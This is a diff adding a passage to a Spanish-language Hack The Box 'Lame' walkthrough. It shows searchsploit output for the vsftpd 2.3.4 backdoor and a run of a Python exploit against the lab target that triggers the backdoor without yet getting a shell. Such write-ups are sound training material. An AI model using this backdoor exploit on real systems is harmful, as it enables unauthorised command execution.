@@ -115,5 +115,25 @@ ftp> dir
 150 Here comes the directory listing.
 226 Directory send OK.
 ```
+No nos olvidemos que puerto 21/tcp FTP tiene la version `vsftpd 2.3.4` buscaremos algun exploit para acceder manualmente sin usar `metasploit`. Lo buscamos rápidamente con searchsploit
 
+```console
+root@rebcesp:/home/rebcesp/htb/Lame/nmap# searchsploit vsftpd 2.3.4
+--------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                 |  Path
+                                                               | (/usr/share/exploitdb/)
+--------------------------------------------------------------- ----------------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)         | exploits/unix/remote/17491.rb
+--------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+```
+Buscamos un exploit en algun repositorio de github y encontramos algunos de ellos que utilizamos , la  vulnerabilidad de esta versión se basa en una `sonrisa :)` si lees el código del exploit podras darte cuenta que se intenta aunteticar con una carita feliz. De todos modos al lanzar el exploit al target no funciona.
+Se queda pensando...
+
+```console
+root@rebcesp:/home/rebcesp/htb/Lame/exploits# python3 vsftpd_234_exploit.py 10.10.10.3 21 whoami
+[*] Attempting to trigger backdoor...
+[+] Triggered backdoor
+[*] Attempting to connect to backdoor...
+```
 
